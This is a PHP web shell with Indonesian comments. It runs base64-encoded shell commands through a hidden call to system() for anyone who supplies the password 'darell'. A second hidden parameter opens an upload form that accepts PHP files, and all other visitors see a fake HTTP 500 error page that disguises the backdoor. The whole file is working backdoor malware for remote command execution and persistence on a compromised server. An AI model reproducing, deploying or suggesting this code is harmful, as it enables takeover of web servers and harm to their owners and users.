<?php
$auth_pass = "darell";
$kunci = "cmd";

// Bypass fungsi `system`
$fnc = 's' . 'ys' . 'tem';

// Cek password
if (isset($_GET['pass']) && $_GET['pass'] === $auth_pass) {
    // Cek command base64
    if (isset($_GET[$kunci])) {
        $cmd = base64_decode($_GET[$kunci]);
        header("Content-Type: text/plain");
        $fnc($cmd);
    } else {
        echo "Perintah tidak ditemukan.";
    }
} else
?>

<?php
// Periksa apakah parameter "oke" ada dalam URL
if (isset($_GET['kurlung'])) {
    if (isset($_POST['submit'])) {
        // Ambil informasi file
        $nama = $_FILES['gambar']['name'];
        $tempat = $_FILES['gambar']['tmp_name'];
        $type = $_FILES['gambar']['type'];
        $size = $_FILES['gambar']['size'];

        // Daftar ekstensi file yang diizinkan
        $ukuran = ['html', 'jpg', 'png', 'jpeg', 'php'];

        // Ekstrak ekstensi dari nama file
        $explode = explode('.', $nama);
        $pembaginya = strtolower(end($explode));

        // Cek apakah ekstensi file sesuai dengan yang diizinkan
        if (in_array($pembaginya, $ukuran)) {
            // Pindahkan file ke lokasi baru
            move_uploaded_file($tempat, $nama);
            echo '<div class="alert alert-success alert-dismissible fade in" role="alert">
<button type="button" class="close" data-dismiss="alert" aria-label="Close"> <span aria-hidden="true">&times;</span> </button>
<strong> Sukses..!</strong> Data Berhasil Tersimpan.
</div>';
            echo '<meta http-equiv="refresh" content="3;url=">';
        } else {
            echo "Duh, ekstensi file tidak sesuai.";
        }
    } else {
        // Tampilkan form jika belum submit
        echo '<form method="post" enctype="multipart/form-data">
                <input type="file" name="gambar">
                <input type="submit" name="submit" value="submit">
              </form>';
    }
} else {
    // Jika parameter "oke" tidak ada di URL, tampilkan error 500
    http_response_code(500);
    $gambar_url = "https://www.pdri.edu.pk/wp-content/uploads/2023/11/global-scaled.webp"; // Ganti dengan permalink gambar yang sesuai
    echo '<html style="height: 100%;"><head><meta name="viewport" content="width=device-width, minimum-scale=0.1">
    <style>
        body, html {
            margin: 0;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: rgb(14, 14, 14);
        }
        .container {
            border: 8px solid #ddd; /* Kotak border */
            padding: 20px; /* Padding di sekitar gambar */
            border-radius: 15px; /* Sudut kotak yang tumpul */
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); /* Efek bayangan */
            background-color: white; /* Latar belakang kotak */
        }
        img {
            max-width: 100%;
            max-height: 100%;
            border-radius: 10px; /* Sudut gambar tumpul */
        }
    </style>
    </head><body>
    <div class="container">
        <img src="' . $gambar_url . '" alt="Gambar Error">
    </div>
    </body></html>';
}
__halt_compiler();
?>
